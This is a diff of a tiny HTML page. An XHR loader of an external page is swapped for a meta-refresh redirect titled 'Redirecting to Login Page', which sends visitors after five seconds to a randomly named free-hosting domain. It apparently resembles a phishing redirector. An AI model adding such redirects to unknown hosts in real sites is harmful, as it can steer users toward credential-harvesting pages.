@@ -1,29 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load Content Dynamically</title>
+    <title>Redirecting to Login Page</title>
+    <!-- Redirecting to another page using meta tag -->
+    <meta http-equiv="refresh"
+          content="5; url =https://duskiest-piers.000webhostapp.com" />
 </head>
-<body>
-
-<div id="content"></div>
-
-<script>
-    function loadPage(url) {
-        var xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function() {
-            if (this.readyState == 4 && this.status == 200) {
-                document.getElementById("content").innerHTML = this.responseText;
-            }
-        };
-        xhttp.open("GET", url, true);
-        xhttp.send();
-    }
-
-    // Call loadPage function with the URL of the page you want to load
-    loadPage("https://duskiest-piers.000webhostapp.com");
-</script>
-
-</body>
-</html>
